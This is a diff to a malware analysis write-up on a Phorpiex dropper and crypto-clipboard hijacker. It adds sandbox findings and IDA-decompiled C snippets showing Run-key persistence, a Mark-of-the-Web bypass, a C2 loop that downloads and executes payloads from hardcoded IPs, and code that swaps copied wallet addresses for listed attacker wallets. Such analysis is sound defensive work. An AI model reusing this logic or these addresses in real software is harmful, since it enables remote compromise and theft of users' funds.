@@ -90,7 +90,7 @@ CryptGenRandom         ADVAPI32.dll
 CryptReleaseContext    ADVAPI32.dll
 rand, srand            msvcrt.dll
 ```
-\- `CryptGenRandom` - cryptographically secure random generation, potentially used for encryption of C2 traffic
+\- `CryptGenRandom` - cryptographically secure random generation, potentially used for encryption of C2 traffic  
 \- `rand/srand` may indicate custom encryption algorithm
 
 
@@ -110,6 +110,7 @@ Sleep, GetTickCount   KERNEL32.dll
 http://185.156.72.39/
 http://45.141.233.6/
 www.update.microsoft.com (likely decoy/masquerading)
+239.255.255.250
 ```
 
 *User-Agent String:*
@@ -155,4 +156,181 @@ Terra:       terra1mw3dhwak2qe46drv4g7lvgwn79fzm8nr0htdq5
 Zilliqa:     zil19delrukejtr306u0s7ludxrwk434jcl6ghpng3
 ... (40+ additional altcoin addresses)
 ```
-- i think sample monitors clipboard for crypto addresses via `SetClipboardViewer` chain and replaces victim's copied address with attacker's corresponding wallet
+\- i think sample monitors clipboard for crypto addresses via `SetClipboardViewer` chain and replaces victim's copied address with attacker's corresponding wallet
+
+#### <span style="color:red">running in Sandbox</span>
+**optimize.exe**  
+`optimize.exe` acts as a dropper, it downloads a `syscrondvr.exe`
+![alt text](image4.png)
+it set a registry key in `HKEY_CURRENT_USER\SOFTWARE\Microsoft \Windows\CurrentVersion\Run` to sturtup `syscrondvr.exe`
+![alt text](image5.png)
+
+**syscrondvr.exe**
+`syscrondvr.exe` identified as a **PHORPIEX** by Yara and Suricata. it uses a `tbtnds.dat` file, likely to store a configuration data.
+![alt text](image6.png)
+
+And it makes a lot of interesting connections to `185.156.72.39:80` and some other IPs with 4500 port
+![alt text](image7.png)
+![alt text](image8.png)
+
+
+
+### reversing with ida
+#### persistence by \Run\ registry key
+malware copies itself to `%windir%`, `%USERPROFILE%` and `%temp` and renames to `syscrondvr.exe`. Adds registry key to `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\` and `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\`. Changes the attribute of the file and hides it.
+```c
+int start()
+{
+  GetModuleFileNameW(0, &ExistingFileName, 0x105u);// return a filepath
+  String1 = PathFindFileNameW(&ExistingFileName);// return filename from filepath
+// ...[snip]...   
+// 
+  ExpandEnvironmentStringsW(L"%windir%", mw_windir, 0x104u);
+      wsprintfW(NewFileName, L"%s\\%s", mw_windir, L"syscrondvr.exe");
+      if ( CopyFileW(&ExistingFileName, NewFileName, 0) )
+      {
+        SetFileAttributesW(NewFileName, 3u);      // hidden
+        v13 = RegOpenKeyExW(
+                HKEY_LOCAL_MACHINE,
+                L"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\",
+                0,
+                0x20006u,
+                &phkResult);
+        if ( !v13 )
+        {
+          v0 = wcslen(NewFileName);
+          if ( !RegSetValueExW(phkResult, aWindowsSetting, 0, 1u, NewFileName, 2 * v0 + 2) )
+//...[snip]...
+      v13 = RegOpenKeyExW(
+              HKEY_CURRENT_USER,
+              L"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\",
+              0,
+              0x20006u,
+              &phkResult);
+      if ( !v13 )
+      {
+        v1 = wcslen(String);
+        if ( !RegSetValueExW(phkResult, aWindowsSetting, 0, 1u, String, 2 * v1 + 2) )
+//...[snip]...
+```
+#### bypass MotW
+Bypasses Mark of the Web by creating a thread with `:Zone.Identifier` and deleting it.
+```c
+  wsprintfW(FileName, L"%s:Zone.Identifier", &ExistingFileName);
+  DeleteFileW(FileName);
+```
+
+#### configure commands and C2 servers
+Configure paths:  
+\- `tbtnds.dat`: "Trik Bot Nodes" — list of C2 servers
+\- `tbtcmds.dat`: "Commands" — retrieve commands from C2
+```c
+    wsprintfW(&word_4161D0, L"%s\\tbtnds.dat", mw_userprofile);
+    wsprintfW(&::FileName, L"%s\\tbtcmds.dat", mw_userprofile);
+```
+
+#### main C2 logic
+Creates a thread `CreateThread(0, 0, mw_C2_main_loop, 0, 0, 0);`. That thread functional as a C2 loop.
+It iterates through 2 hardcoded IP addresses `(http://185.156.72.39/ and http://45.141.233.6/)` combined with 5 distinct URI suffixes ("1" to "5"), generating a total of 10 potential endpoints per cycle (e.g., http://185.156.72.39/1).  
+
+The function triggers `mw_download_and_execute()` to retrieve (`InternetOpenUrlW + InternetReadFile + WriteFile` or `URLDownloadToFileW`) and run the executable(`ShellExecute`). The loop has a `Sleep(0xDBBA0u)` call, enforcing a 15-minute beacon interval.
+```c
+void __stdcall __noreturn mw_C2_main_loop(PVOID Parameter)
+{
+  memset(v5, 0, sizeof(v5));
+  v4[0] = "1";
+  v4[1] = "2";
+  v4[2] = "3";
+  v4[3] = "4";
+  v4[4] = "5";
+  while ( 1 )
+  {
+    for ( i = 0; i < 2; ++i )
+    {
+      Sleep(0x3E8u);
+      for ( j = 0; j < 5; ++j )
+      {
+        Sleep(0x3E8u);
+        wsprintfA(szUrlName, "%s%s", mw_http_ip[i], v4[j]);
+        DeleteUrlCacheEntry(szUrlName);
+        if ( mw_payload_checks(szUrlName, &v5[j]) == 1 )
+          mw_download_and_execute(szUrlName, 0);
+      }
+    }
+    Sleep(0xDBBA0u);
+  }
+}
+```
+
+#### Replace a crypt
+Creates a Thread `CreateThread(0, 0, mw_main_replace, 0, 0, 0);`, which creates a callback function `mw_WindProc_callback_`. 
+```c
+v4.cbSize = 48;
+  v4.lpfnWndProc = mw_WindProc_callback_;
+  v4.hInstance = GetModuleHandleW(0);
+  v4.lpszClassName = v3;
+```
+
+This function checks if clipboard data was updated (`WM_DRAWCLIPBOARD`), then uses `IsClipboardFormatAvailable` to check a format of clipboard data, `GetClipboardData` to get a descriptor of data, `GlobalLock` to get a pointer to clipboard data, then does some conversion of this data to the necessary format and transfers data to `mw_repcale_crypt` function
+```c
+switch ( Msg )
+    {
+      case 0x308u:       // 0x308 -> WM_DRAWCLIPBOARD
+        uFormat = 0;
+        if ( IsClipboardFormatAvailable(0xDu) ) // unicode text
+        {
+          uFormat = 13;
+        }
+        else if ( IsClipboardFormatAvailable(1u) )// asci
+        {
+          uFormat = 1;
+        }
+        else if ( IsClipboardFormatAvailable(7u) )// CF_OEMTEXT
+        {
+          uFormat = 7;
+        }
+        if ( uFormat && OpenClipboard(0) )
+        {
+          hMem = GetClipboardData(uFormat);
+          mw_ptr_to_pdata = GlobalLock(hMem);
+          lpString = 0;
+          if ( uFormat == 1 )
+          {
+            lpString = mw_convert_to_wide(mw_ptr_to_pdata, 0, 0);
+          }
+          else if ( uFormat == 7 )
+          {
+            lpString = mw_convert1(mw_ptr_to_pdata, 0, 0);
+          }
+          else
+          {
+            lpString = mw_convert2(mw_ptr_to_pdata, 0);
+          }
+            mw_repcale_crypt(lpString);
+// ...[snip]...
+```
+
+`mw_repcale_crypt` function finds if in the user's clipboard data there is a crypto wallet, and replaces it with its own crypto wallet.
+```c
+if ( StrStrW(lpString, L"bitcoincash:") )
+// ...[snip]...
+if ( *lpString == 84 )
+    v5 = "TW3wpRJmZgC5WifuY468JBUCF3TEkzBT5H";
+// ...[snip]...
+if ( lpString[1] == 105 && lpString[2] == 108 )
+      v5 = "zil19delrukejtr306u0s7ludxrwk434jcl6ghpng3";
+    else
+      v5 = "zncBgwqwqquPLHrM4ozrtr3LPyFuNVemy4v";
+// ...[snip]...
+mw_prt_to_replaced_pdata = GlobalLock(hMem);
+      if ( mw_prt_to_replaced_pdata )
+      {
+        memcpy(mw_prt_to_replaced_pdata, v5, v4 + 1);
+        GlobalUnlock(hMem);
+        if ( OpenClipboard(0) )
+        {
+          EmptyClipboard();
+          SetClipboardData(1u, hMem);
+```
+
+
